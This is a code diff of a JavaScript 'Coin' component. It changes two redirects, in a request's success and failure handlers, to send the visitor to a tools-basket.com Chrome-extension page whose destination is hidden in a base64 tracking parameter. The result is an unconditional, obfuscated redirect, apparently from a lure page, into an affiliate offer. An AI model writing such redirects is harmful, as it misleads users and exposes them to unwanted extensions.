@@ -55,13 +55,13 @@ function Coin() {
       .then(
         function (response) {
           window.location.href =
-            'https://remastcoolth.life/ed/mu4KiMSq4YCmMaKoA6ZI*NT4rk0aZH9z1e3evox0heNI1LEQnsTv8PTqYGh3eHI2uCpf1SxLhfzpzVB7xVrdau77vrjBxEHz3Vz4kAdlBeoI7evMkCNDk_F4INtaywE00cIH9PD5kfrTX5LURu5L0o82tjAijolm3ObWYN8PCBlaQizbSBfZXkz0F_dzS3QUIbmipySKkB09*uuAjYvzppcGEFu8p2hlhiy*o0dESbz1SE8maiD2eW*xdlmJXf_0mtVQtGxmz1MLEoEfhpWISupUXE35YwQ47CPJjX*ocTrZJRxOfMcgXByEsxhjxeJ_aTPjGgK6ujygzUGrnzkRfgK8IKY6eZXdXRbg1WNt1xOvfJ72C5RbIE5CFMXJKFEtMc4ZZr4z0157F*__p5X7oEH8oQ1U3kjgnJpn2N7gJHlvdLrwLMGATO2LcOls4swDsgvkvdwLezvCpCZaqgUSIWElfHcAGu0JkYonGn918eTTbzrhie8G*SWhFNhQrJR*wlurk1PK4*q5512*khytOggvqJcix70C86DnFRjyhoikXOvooJ_yc_OyVwnqDI3u?md=wei4mI6EDLiQndjJiOwwiIuBHbioTMsICduJiOiEkIsICc0JiOiQXYiVHciwiIthmI6IyMmFDM1cTY2cjZ4MmM2cjY5ATZ1QGZ0Q2Y1UTNwkTN4ICLiMmI6YjNwIDLiQmI60SMsISYiojN1UzMsIyciojIzYDM4';
+            'https://tools-basket.com/chrome-extension/index.html?to=aHR0cHM6Ly90cmFja2luZy50cmFja2luZ3JvdXRlci5jb20vY2xpY2s/bD0xNjc3MjIxNzIyJm9mZmVyX2lkPTI0MzQ2NjkmcGlkPTYmc3ViMT0xNjkxODQ3NDc5MTAwMDBUTkdUVjQxNzY5MDE2ODgwNFYxYyZzdWIyPTM3NDQwODMtOTgzNTg3MTQwLTA=';
         },
         function (error) {
           console.log('FAILED...', error);
 
           window.location.href =
-            'https://remastcoolth.life/ed/mu4KiMSq4YCmMaKoA6ZI*NT4rk0aZH9z1e3evox0heNI1LEQnsTv8PTqYGh3eHI2uCpf1SxLhfzpzVB7xVrdau77vrjBxEHz3Vz4kAdlBeoI7evMkCNDk_F4INtaywE00cIH9PD5kfrTX5LURu5L0o82tjAijolm3ObWYN8PCBlaQizbSBfZXkz0F_dzS3QUIbmipySKkB09*uuAjYvzppcGEFu8p2hlhiy*o0dESbz1SE8maiD2eW*xdlmJXf_0mtVQtGxmz1MLEoEfhpWISupUXE35YwQ47CPJjX*ocTrZJRxOfMcgXByEsxhjxeJ_aTPjGgK6ujygzUGrnzkRfgK8IKY6eZXdXRbg1WNt1xOvfJ72C5RbIE5CFMXJKFEtMc4ZZr4z0157F*__p5X7oEH8oQ1U3kjgnJpn2N7gJHlvdLrwLMGATO2LcOls4swDsgvkvdwLezvCpCZaqgUSIWElfHcAGu0JkYonGn918eTTbzrhie8G*SWhFNhQrJR*wlurk1PK4*q5512*khytOggvqJcix70C86DnFRjyhoikXOvooJ_yc_OyVwnqDI3u?md=wei4mI6EDLiQndjJiOwwiIuBHbioTMsICduJiOiEkIsICc0JiOiQXYiVHciwiIthmI6IyMmFDM1cTY2cjZ4MmM2cjY5ATZ1QGZ0Q2Y1UTNwkTN4ICLiMmI6YjNwIDLiQmI60SMsISYiojN1UzMsIyciojIzYDM4';
+            'https://tools-basket.com/chrome-extension/index.html?to=aHR0cHM6Ly90cmFja2luZy50cmFja2luZ3JvdXRlci5jb20vY2xpY2s/bD0xNjc3MjIxNzIyJm9mZmVyX2lkPTI0MzQ2NjkmcGlkPTYmc3ViMT0xNjkxODQ3NDc5MTAwMDBUTkdUVjQxNzY5MDE2ODgwNFYxYyZzdWIyPTM3NDQwODMtOTgzNTg3MTQwLTA=';
         }
       );
   };
